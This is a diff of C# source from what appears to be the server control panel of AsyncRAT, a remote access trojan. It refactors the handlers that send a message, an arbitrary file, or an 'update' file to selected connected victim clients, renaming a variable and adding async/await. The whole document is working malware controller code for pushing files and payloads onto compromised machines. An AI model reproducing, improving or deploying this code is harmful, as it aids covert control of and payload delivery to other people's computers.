@@ -110,14 +110,14 @@ namespace AsyncRAT_Sharp
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                string URL = Interaction.InputBox("Message", "Message", "Hello World!");
-                if (string.IsNullOrEmpty(URL))
+                string Msgbox = Interaction.InputBox("Message", "Message", "Hello World!");
+                if (string.IsNullOrEmpty(Msgbox))
                     return;
                 else
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "sendMessage";
-                    msgpack.ForcePathObject("Message").AsString = URL;
+                    msgpack.ForcePathObject("Message").AsString = Msgbox;
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
                         Task.Run(() =>
@@ -130,7 +130,7 @@ namespace AsyncRAT_Sharp
             }
         }
 
-        private void sENDFILEToolStripMenuItem_Click_1(object sender, EventArgs e)
+        private async void sENDFILEToolStripMenuItem_Click_1(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -141,12 +141,12 @@ namespace AsyncRAT_Sharp
                     {
                         MsgPack msgpack = new MsgPack();
                         msgpack.ForcePathObject("Packet").AsString = "sendFile";
-                        msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
+                        await msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
                         msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(O.FileName);
                         msgpack.ForcePathObject("Update").AsString = "false";
                         foreach (ListViewItem C in listView1.SelectedItems)
                         {
-                            Task.Run(() =>
+                            await Task.Run(() =>
                             {
                                 Clients CL = (Clients)C.Tag;
                                 CL.BeginSend(msgpack.Encode2Bytes());
@@ -179,7 +179,7 @@ namespace AsyncRAT_Sharp
             }
         }
 
-        private void uPDATEToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void uPDATEToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -190,12 +190,12 @@ namespace AsyncRAT_Sharp
                     {
                         MsgPack msgpack = new MsgPack();
                         msgpack.ForcePathObject("Packet").AsString = "sendFile";
-                        msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
+                        await msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
                         msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(O.FileName);
                         msgpack.ForcePathObject("Update").AsString = "true";
                         foreach (ListViewItem C in listView1.SelectedItems)
                         {
-                            Task.Run(() =>
+                            await Task.Run(() =>
                             {
                                 Clients CL = (Clients)C.Tag;
                                 CL.BeginSend(msgpack.Encode2Bytes());
